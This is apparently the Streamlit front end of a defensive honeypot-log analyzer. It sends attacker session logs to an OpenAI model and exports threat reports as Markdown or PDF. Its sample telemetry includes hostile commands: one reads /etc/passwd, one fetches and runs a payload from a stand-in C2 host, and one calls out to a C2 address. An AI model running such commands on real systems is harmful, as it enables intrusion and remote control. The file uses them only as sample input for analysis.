import streamlit as st
import io
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from analyzer import analyze_honeypot_telemetry

st.set_page_config(page_title="HoneyNode-AI | Deception & Threat Capture", page_icon="🍯", layout="wide")

st.title("🍯 HoneyNode-AI")
st.markdown("### Autonomous Deception & Attacker Intelligence Engine")
st.markdown("Analyze raw honeypot interaction logs, profile attacker intent, and correlate TTPs directly to MITRE ATT&CK framework.")

st.sidebar.header("🔐 Configuration")
api_key = st.sidebar.text_input("OpenAI API Key", type="password")

st.sidebar.markdown("---")
st.sidebar.markdown("### 📊 Sample Honeypot Telemetry")
sample_telemetry = """[2026-06-06 14:10:01] HONEYPOT-SSH: Connection from 185.220.101.5:48321
[2026-06-06 14:10:03] AUTH: Username 'root', Password 'admin123' - FAILED
[2026-06-06 14:10:05] AUTH: Username 'root', Password '123456' - SUCCESS (Simulated Access Granted)
[2026-06-06 14:10:07] CMD: 'uname -a; id; cat /etc/passwd'
[2026-06-06 14:10:12] CMD: 'wget http://malicious-c2.top/x86_payload.bin -O /tmp/x86; chmod +x /tmp/x86'
[2026-06-06 14:10:15] CMD: '/tmp/x86 --connect-c2 198.51.100.44:8080'"""

if st.sidebar.button("Load Sample Telemetry"):
    st.session_state["telemetry_input"] = sample_telemetry

telemetry_input = st.text_area("Paste Honeypot Session / Decoy Telemetry Logs:", value=st.session_state.get("telemetry_input", ""), height=200)

if st.button("🚀 Analyze Attacker Intent", type="primary"):
    if not api_key:
        st.error("Please enter your OpenAI API Key.")
    elif not telemetry_input.strip():
        st.error("Please enter honeypot telemetry.")
    else:
        with st.spinner("Decoding payload and profiling adversary..."):
            result = analyze_honeypot_telemetry(api_key, telemetry_input)
            st.session_state["honeypot_result"] = result

if "honeypot_result" in st.session_state:
    st.markdown("---")
    st.subheader("📋 HoneyNode-AI Threat Intelligence Report")
    st.markdown(st.session_state["honeypot_result"])
    
    st.markdown("---")
    col1, col2 = st.columns(2)
    
    with col1:
        st.download_button(
            label="📥 Download Markdown Report",
            data=st.session_state["honeypot_result"],
            file_name="HoneyNode_AI_Report.md",
            mime="text/markdown"
        )
        
    with col2:
        def create_pdf(text):
            buffer = io.BytesIO()
            p = canvas.Canvas(buffer, pagesize=letter)
            width, height = letter
            p.drawString(50, height - 50, "HoneyNode-AI Attacker Profile Report")
            textobject = p.beginText(50, height - 80)
            textobject.setFont("Helvetica", 10)
            
            for line in text.split("\n"):
                if textobject.getY() < 50:
                    p.drawText(textobject)
                    p.showPage()
                    textobject = p.beginText(50, height - 50)
                    textobject.setFont("Helvetica", 10)
                textobject.textLine(line[:90])
                
            p.drawText(textobject)
            p.save()
            buffer.seek(0)
            return buffer.getvalue()

        pdf_data = create_pdf(st.session_state["honeypot_result"])
        st.download_button(
            label="📄 Download PDF Report",
            data=pdf_data,
            file_name="HoneyNode_AI_Report.pdf",
            mime="application/pdf"
        )
